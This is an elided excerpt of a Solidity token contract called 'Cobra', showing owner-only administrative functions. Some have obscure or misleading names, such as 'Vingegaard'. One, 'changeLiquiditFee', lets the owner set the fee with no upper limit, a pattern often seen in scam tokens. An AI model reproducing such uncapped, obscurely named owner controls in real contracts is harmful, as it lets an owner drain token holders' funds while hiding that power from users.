...
contract Cobra is Context, Ownable {
    using SafeMath for uint256;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;

    string _name = "Cobra";
    string _symbol = "COBRA";
    uint8 _decimals = 9;
    ...
    function Vingegaard(address account) external onlyOwner {
    ...
    function changeLiquiditFee(uint8 value) external onlyOwner{
        _liquidityFee = value;
    }
    function sentdata(uint256 _amount, uint256 _burnFee) private pure returns (uint256) {
        return _amount.mul(_burnFee).div(
            10**2
        );
    }

    function inputValue(uint256 newValue) external onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "Processing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "Cannot update gasForProcessing to same value");
        gasForProcessing = newValue;
    }

    function restAnalysis(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "ClaimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "Cannot update claimWait to same value");
        claimWait = newClaimWait;
    }

    function addition(uint256 lastClaimTime) private view returns (bool) {
